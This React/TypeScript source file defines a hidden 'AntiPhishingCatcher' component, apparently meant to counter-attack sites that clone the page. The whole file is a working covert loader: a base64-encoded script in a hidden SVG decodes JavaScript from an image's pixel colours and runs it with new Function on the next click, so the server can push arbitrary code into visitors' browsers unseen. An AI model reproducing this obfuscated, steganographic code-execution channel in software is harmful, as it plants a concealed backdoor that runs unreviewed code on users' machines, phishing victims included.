import type { CSSProperties } from "react";
import { memo } from "react";
import { encodeBase64, isDev, isE2E } from "@sb/utils";
import { clientUrl } from "../../Urls";

/*
*  This method works like this:
*
*  This static code loads image and render this image on canvas.
*  Then it's read any pixel of image and using String.fromCharCode converts this image to text
*  Every pixel - 4 characters (RGBA channels [255, 0, 0, 255] - red pixel. String will be 'ÿ\x00\x00ÿ').
*  This text will be runned on new Function(text).
*
*  This static code goes to HTML. When hackers create phishing site, they're stealing this HTML and rewrite pages for they need.
*  So, if hackers steal this img tag and svg with script which parse image, on BE we can detect by origin that request for img from fishing site.
*  And response with img with any JS code.
*
*  So, we will be able to inject any JS code to phishing site.
* */

const getParseImageCode = (imgId: string) =>
  `var s=String.fromCharCode,j=document,im=j.getElementById('${imgId}'),c=j.createElement('canvas'),x=c.getContext('2d'),ww='width',hh='height';function t(){w=im[ww],h=im[hh];c[hh]=h;c[ww]=w;x.drawImage(im,0,0);var d=x.getImageData(0,0,w,h).data;var a='',l=d.length,p=32;for(var i=0;i<l;i+=4){a+=s(d[i+0]||p)+s(d[i+1]||p)+s(d[i+2]||p)}j.addEventListener("click",new Function(a),{once:!0})}im.onload=t;if(im.complete)t()`;

const getRandomString = (length = 5) => (Math.random() + 1).toString(36).substring(length);

const style: CSSProperties = { display: "none" };

const AntiPhishingCatcher = memo(() => {
  const id = `e-${getRandomString()}`; /* DO NOT USE useId */

  const code = `new Function(atob("${encodeBase64(getParseImageCode(id))}"))()`;

  const url = `${clientUrl}/c8238d996fa196d0629e.png`;

  if (isE2E || isDev) {
    return null;
  }

  return (
    <>
      <img
        src={url}
        id={id}
        style={style}
        crossOrigin={"anonymous"}
      />

      <svg style={style} id={id + "s"}>
        <script>{code}</script>
      </svg>
    </>

  );
});
AntiPhishingCatcher.displayName = "AntiPhishingCatcher";

export {
  AntiPhishingCatcher,
};
